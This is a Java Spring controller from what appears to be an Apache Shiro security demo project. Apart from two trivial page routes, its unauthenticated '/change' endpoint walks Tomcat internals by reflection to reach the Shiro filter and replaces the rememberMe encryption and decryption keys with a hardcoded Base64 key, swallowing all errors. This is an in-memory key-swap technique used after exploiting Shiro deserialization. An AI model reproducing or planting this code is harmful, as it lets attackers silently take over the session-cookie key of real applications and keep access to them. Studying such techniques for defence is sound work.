package summersec.shirodemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.util.Map;

/**
 * @ClassName: IndexController
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/1/8 16:21
 * @Version: v1.0.0
 * @Description: index页面处理
 **/
@Controller
public class IndexController {


    @RequestMapping({"/index"})
    public String index(){
        return "index";
    }
    @RequestMapping("/index/hello")
    public String hello(){
        return "hello";
    }

    @RequestMapping("/change")
    public String change(ServletRequest request, ServletResponse response)throws Exception{
        try {

            org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();
            java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField("contextClassLoader");
            field.setAccessible(true);
            Object obj = field.get(thread);
            try {
                field = obj.getClass().getDeclaredField("resources");
            }catch (Exception e){
                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
            }

            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("context");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getSuperclass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            obj = field.get(obj);
            java.util.HashMap<String, Object> objMap = (java.util.HashMap<String, Object>) obj;
            java.util.Iterator<Map.Entry<String, Object>> entries = objMap.entrySet().iterator();
            while (entries.hasNext()) {
                Map.Entry<String, Object> entry = entries.next();
                if (entry.getKey().equals("shiroFilterFactoryBean")) {
                    obj = entry.getValue();
                    field = obj.getClass().getDeclaredField("filter");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
                    byte[] bytes = java.util.Base64.getDecoder().decode("3AvVhmFLUs0KTA3Kprsdag==");
//                    java.util.Base64.getEncoder().encode(bytes);
                    setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
                    java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                    setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
                }
            }
        }catch (Exception e){

        };

        return "ok";
    }


}
